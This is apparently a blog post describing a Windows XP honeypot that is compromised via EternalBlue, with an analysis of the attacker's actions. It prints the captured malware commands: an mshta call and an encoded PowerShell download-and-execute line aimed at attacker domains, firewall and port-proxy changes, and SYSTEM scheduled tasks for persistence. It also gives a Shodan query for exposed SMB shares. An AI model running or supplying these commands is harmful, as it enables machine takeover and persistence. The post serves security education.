+++
author = "grunt22fox"
date = 2025-01-30
title = 'Running an open Windows XP virtual machine as a honeypot'
description = 'Windows XP on the open internet, shenanigans follow'
tags = [
    "hacking",
    "hijacking",
]
toc = true
+++

What happens when you expose every port on an XP virtual machine to the internet? Funny things.
<!--more-->

---

## Background

I have an avid interest in old technology; I also have a passing interest in security. So one day on YouTube, the algorithm decided to promote this video that you may or may not have seen:

{{< youtube 6uSVVCmOH5w >}}

<br><br>

The premise? Connect Windows XP to the open internet, because it hasn't recieved active patches for years and is bound to be vulnerable to several exploits. Indeed, in the video, the virtual machine is hijacked and various different programs are dropped by malicious actors to make the OS do their bidding. So I thought, why not try it myself?

## How it works

If you have used Windows XP or any similarly older operating system recently, you may notice that it hasn't just been able to be hijacked out of the blue without user interaction. Why does it happen here, then? This has to do with something called [network address translation (NAT)](https://en.wikipedia.org/wiki/Network_address_translation). For IPv4, there are only as many as 2<sup>32</sup> IP addresses available, or 4,294,967,296 if you don't take into account [reserved or special ranges](https://en.wikipedia.org/wiki/Reserved_IP_addresses). There are much more than 4 billion devices in this world and to put it simply, we ran out of IP addresses that could be allocated for public use in January 2011.

Previously, especially in the age of dial-up before this limit was reached and where IP address use was much more liberal, individual computers would have their own public IP addresses, such as the one you get if you look up "what is my IP" on Google. Now, effectively all networks will use NAT to translate private IP addresses (such as `192.168.1.12`) to your actual public IP address. This also has a side effect in security, as most routers will require you to port forward before a deivce can forward its own services out to the internet. Before, it was common for this to happen on devices connected directly to the Internet with little to no firewall, which we will be replicating in practice here (albeit by using port forwarding).

Interested in how NAT came to be? Check out this great video by The Serial Port:

{{< youtube GLrfqtf4txw >}}

## The setup

Because of the way my network is set up, this required a lot of jankiness, but in the end I was able to get the desired result of exposing XP to the maximum extent possible. For some context, internet access in the area is limited and/or not good, so I have to use Starlink. Luckily, you can allocate a public IP address from them, so this solves the problem of [carrier-grade NAT](https://en.wikipedia.org/wiki/Carrier-grade_NAT) which would prevent us from being able to actually access our fake machine on the open internet.

So how does the network actually run? I use [OPNsense](https://opnsense.org/) (a very good router and firewall that you should check out!) as a virtual machine on my server, the specs of which you can check out on the projects page. An Intel i350-t4 is passed through on the hardware level to this virtual machine, which allows it to function as intended despite being virtualized. This will actually come into play later on where some problems start to arise.

By default, I have two ports used as WAN and LAN respectively, with the LAN being fed to a 24-port unmanaged Cisco switch. Normally, this is good enough for me as I haven't needed to use VLANs, subnetting is about as far as I go - however, it wouldn't cut it here. I would really prefer not to run an exposed VM on my main network adjacent to all of my servers and clients; so I needed to search for another solution.

### The jank

This is where things start to get janky. Remember how the NIC being used on OPNsense has 4 ports? Realistically, I can throw up a new interface on OPNsense for one of the two free ports and then customize it as needed from there, with its own firewall rules and IP range. This is what I ended up with:

![my OPNsense interfaces](/images/xp-honeypot/opnsense-interfaces.png)

NUKE is the interface we will host the XP virtual machine on, simply being fed to an Ethernet cable that will connect to a machine hosting it. Its gateway would be `192.168.69.1`, and the virtual machine would be given a static address of `192.168.69.69`. I had to dig out an old gaming laptop for this that I have mostly stopped using, but unlike my current laptop, actually has an Ethernet port. This could then be bridged to Virtualbox directly, not providing my laptop with any IP addresses or internet access as I specifically did not set a DHCP server up. For that, the wireless card would provide internet access instead.

Normally, I forward some ports out for things like game servers - however since I wanted to forward every port imaginable to the virtual machine, I needed to disable my existing rules. I would then create a wildcard rule for the address as seen below:

![port forwarding](/images/xp-honeypot/forwarding.png)

With everything set in place, the final pipeline for network access to the VM would look something like this:

> Virtual Machine NIC > Laptop NIC > OPNsense Firewall > NAT from local IP to public IP > WAN

Could I just connect the virtual machine directly to WAN and bypass this entire setup? Maybe, but then I wouldn't have internet access at all aside from that select VM, and I really didn't want to do that - so why not just let it be hijacked while I do other stuff in the background?

## Setting the trap

I used Windows XP Professional SP3 with no additional updates for this virtual machine, and disabled the firewall while I was at it to achieve the maximum possible exposure. It's worth noting that the firewall may have failed anyway even if I kept it on just because it was so outdated. With this, I then enabled the above showcased port forwarding rule, which promptly forwarded all incoming traffic to the VM. To monitor it, I used an old version of Process Explorer by Sysinternals, like Eric Parker. This would allow me to monitor active threads and applications, especially their active TCP/IP connections.

## The results

I started this honeypot on 1/16/2025 at around 6 AM CST. Much traffic would be miscellaneous, but around an hour later I would get the first probing from an outside IP address onto SMB. SMB is [Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block), used for sharing various things on Windows like printers, files, and more on a network. This is normally intended for local networks, but will also function over the public Internet as long as a connection can be made. It is also highly insecure in earlier versions like SMBv1 such as here on Windows XP, being a common entry of attack.

SMB would eventually start to be bruteforced several hours later by different IP addresses that likely probed and found the VM I had set out, trying to access resources such as `\Administrator`, `\admin`, `\hp`, `\ADMINSOP`, `\DefaultAccount`, `\Invitado`, and more. Eventually, 7 hours later, an IP address would attempt to seemingly send SMB packets sent with the number 3, which would continue until the machine eventually crashed as seen below:

![crashed VM](/images/xp-honeypot/crashed.png)

After this, I of course restarted the VM and business would continue as normal until big things started happening. An IP address `117.217.42.26` would send malformed SMB packets to the virtual machine, seemingly using the [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) exploit to gain access. This would be successful as the machine was not patched against EternalBlue, although Microsoft *did* patch this for XP through the [MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) security bulletin. Once the actual hijacking was completed, this is where the interesting stuff began.

![new threads post-exploitation](/images/xp-honeypot/threads.png)

As seen above, processes started running that should not have been normally running - for example, svchost started running a command prompt session which was running `mshta.exe`, which can be [abused by attackers](https://attack.mitre.org/techniques/T1218/005/) (such as in this case) to run external scripts that can advance their objectives. Additionally, a `netsh.exe` session was spun up in a separate command prompt. For the purposes of this article, our focus is going to be on `mshta.exe` as this seems to have been how attackers established their control over the machine.

![the mshta command](/images/xp-honeypot/mshta2.png)

The command used here was `mshta http://w.zz3r0.com/page.html?pFUCK-G1XZ20`, with the latter part being the name of the virtual machine. Although I could not get this page to actually load on my own machines, the domain is registered as of the writing of this article using a PARKTONS nameserver. I assume this is a pre-crafted page designed to drop files related to exploiting the machine, as you will see later. More is in the TCP/IP tab:

![linode????](/images/xp-honeypot/mshta.png)

We can see that mshta has established a connection to http://66-228-54-160.ip.linodeusercontent.com, but what the hell is actually on there? Going to the site, we can see that it is completely blank other than a copyright notice on the bottom of the page as well as a cookie cutter privacy policy, however looking in the debugger section of Firefox's developer tools, we can see two scripts: `deliver.js` and `nrb.js`. The first script has a couple of random sites as well as notably fetching data related to Google Adsense although the page does not actually display ads, and although I thought the second script may have been related to C2 because of how obfuscated it was, it turns out it was just some sort of analytics script developed by New Relic. It seems the page may be related to collecting data analytics related to hijacked machines? I may be wrong, but that is my guess.

When inspecting the Wireshark packets, I can see that `C:\Windows\temp\msInstall.exe` is ran early on, followed by a large string of data from the program, followed by some commands being ran. There were periods placed throughout these commands because of how the packets are crafted, but if you're curious to see the actual data, it is pasted below (minus any periods):

```cmd /c echo rCsPzfRF >> c:\windows\temp\msInstallexe&echo copy /y c:\windows\temp\msInstallexe c:\windows\eVBnjnexe>c:/windows/temp/pbat&echo "*" >c:\windows\temp\ebtxt&echo netsh interface ipv6 install >>c:/windows/temp/pbat &echo netsh firewall add portopening tcp 65532 DNS2  >>c:/windows/temp/pbat&echo netsh interface portproxy add v4tov4 listenport=65532 connectaddress=1111 connectport=53 >>c:/windows/temp/pbat&echo netsh firewall add portopening tcp 65531 DNSS2  >>c:/windows/temp/pbat&echo netsh interface portproxy add v4tov4 listenport=65531 connectaddress=1111 connectport=53 >>c:/windows/temp/pbat&echo netsh firewall add portopening tcp 65529 DNSS3  >>c:/windows/temp/pbat&echo netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1111 connectport=53 >>c:/windows/temp/pbat&echo if exist C:/windows/system32/WindowsPowerShell/ (powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHQALgBhAG0AeQBuAHgALgBjAG8AbQAvAGcAaQBtAC4AagBzAHAAJwApAA==^&schtasks /create /ru system /sc MINUTE /mo 60 /st 07:05:00 /tn FnPC /tr "c:\windows\eVBnjnexe" /F) else start /b sc start Schedule^&ping localhost^&sc query Schedule^|findstr RUNNING^&^&^(schtasks /delete /TN Autocheck /f^&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr "cmdexe /c mshta http://wzz3r0com/pagehtml?p%COMPUTERNAME%"^&schtasks /run /TN Autocheck^&schtasks /delete /TN FnPC /f^&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN FnPC /tr "c:\windows\eVBnjnexe"^&schtasks /run /TN FnPC^&schtasks /delete /TN Autoload /f^&schtasks /create /ru system /sc MINUTE /mo 10 /ST 07:00:00 /TN Autoload /tr "c:\windows\temp\installedexe"^&schtasks /run /TN Autoload^) >>c:/windows/temp/pbat&echo net start Ddriver >>c:/windows/temp/pbat&echo for /f  %%i in ('tasklist ^^^| find /c /i "cmdexe"'^) do set s=%%i >>c:/windows/temp/pbat&echo if %s% gtr 10 (shutdown /r) >>c:/window/SMB/HX/PSMB/HX@?s/temp/pbat&echo del c:\windows\temp\pbat>>c:/windows/temp/pbat&echo c:\windows\temp\installedexe>>c:/windows/temp/pbat&cmdexe /c c:/windows/temp/pbat&cmd /c c:\windows\temp\installedexe```

Several things are happening here. A, the `msInstall.exe` program is being copied to other places on the computer, IPv6 seems to be installed, ports are being opened and a port proxy is created, a base64 encoded powershell script is ran which decodes to `IEX(New-Object Net.WebClient).DownloadString('http://t.amynx.com/gim.jsp')`, tasks are scheduled, and finally, certain files are deleted. This has marked effects across the system and seems to be for the goal of persistence, especially with the scheduled tasks.

![the scheduled tasks](/images/xp-honeypot/tasks.png)

If you're curious about the exe which was dropped onto the machine, I uploaded it to [VirusTotal](https://www.virustotal.com/gui/file/990543287d35a34f0e6d62ca852012915246cd9df6faf052f4741b9ea2890090/detection). Ultimately this may have been intended to enslave the machine into a botnet, I'm not quite sure, but I think the information collected is quite interesting and thought it would be worth sharing.

## Why it matters today

One would think that this is a pointless exercise because like I said, most machines, even those running insecure versions of Windows like the one I used, aren't really subject to this kind of sophisticated automated attack. However, there are billions upon billions of machines across the world running right now, some of which are not only vulnerable and old, but also exposed to the internet because of one reason or another. This can be demonstrated by using Shodan - where every IP address is scanned and can be looked up. By using the query `"Authentication: disabled" port:445`, we can find SMB shares with zero authentication, running and accessible to the open internet. 

![shodan exposure](/images/xp-honeypot/shodan.png)

While almost 220,000 hits is a small number when taking into account the larger Internet, it is a substantial number of compromisable machines nonetheless (especially in Pakistan, for whatever reason), and demonstrates why it is economical for IP addresses to continue to scan and attempt to hijack machines in the manner that happened to my honeypot VM. These machines are still exploited and used for nefarious purposes constantly; whether it is seen or not. The lesson? Make sure that you are properly configuring your network - do not expose any more than is actually necessary. Wall off your stuff properly, and if you seriously need to use legacy hardware, make sure it is walled off!